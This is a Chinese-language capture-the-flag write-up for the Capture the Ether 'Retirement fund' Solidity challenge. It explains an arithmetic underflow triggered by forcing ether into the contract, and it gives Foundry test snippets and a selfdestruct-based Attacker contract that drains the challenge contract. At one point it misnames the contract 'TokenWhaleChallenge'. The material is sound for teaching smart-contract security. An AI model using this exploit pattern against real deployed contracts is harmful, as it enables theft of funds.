# Retirement fund

## 题目描述

[原题链接](https://capturetheether.com/challenges/math/retirement-fund/)

原题目要求 RetirementFundChallenge 合约的 ether 余额为 0。最开始的时候 owner 会充值 1 ether 到合约。

## 运行

**安装 Foundry**

根据 [Foundry 官方文档](https://getfoundry.sh/)配置好运行环境。

**运行测试**

```sh
$ cd WTF-CTF

$ forge test -C src/Capture_the_Ether/Math/Retirement_fund -vvv
```

## 功能简述

在原题 `^0.4.21` 版本下，所有的算术操作都是 unchecked，因此为了能够复现这个 Challenge，我给 collectPenalty 里面的某一行增加了 unchecked。

TokenWhaleChallenge 有两个角色，一个是 owner，他部署了这个合约，并锁定了 1 ether。另一个是 player，如果 owner 提前提走资金，合约的以太币的 10% 会转到 player。

该合约的问题是使用了 `address(this).balance` 来作为判定条件，实际上一个合约的 ether balance 是可以使用出块时 coinbase 的充值或者其他合约的 selfdestruct 来强制改变的。

解决思路是，player 转入合约一定量的 ether，使得 `withdrawn = startBalance - address(this).balance` 成为一个下溢出的数，然后转移所有的资金。

在 testRetirementFund1 测试函数中，尝试直接 RetirementFundChallenge 合约转账失败，因为原合约里面没有实现 fallback/receive 函数

```solidity
        vm.startPrank(hacker);
        vm.expectRevert();
        payable(address(retirementFundChallenge)).transfer(1 wei);

        vm.expectRevert();
        retirementFundChallenge.collectPenalty();
        vm.stopPrank();
```

因此我们需要部署一个辅助合约来强制转移 ether。

这个是辅助合约 Attacker，在执行构造函数的时候就自我销毁，并将余额转入 target 地址。

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

contract Attacker {
    constructor(address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
```

然后我们在 testRetirementFund2 里，使用 1 wei 创建 Attacker，这样就能强制将 1 wei 转入 RetirementFundChallenge 合约

```solidity
        vm.startPrank(hacker);
        new Attacker{value: 1 wei}(payable(address(retirementFundChallenge)));

        retirementFundChallenge.collectPenalty();
        vm.stopPrank();
```

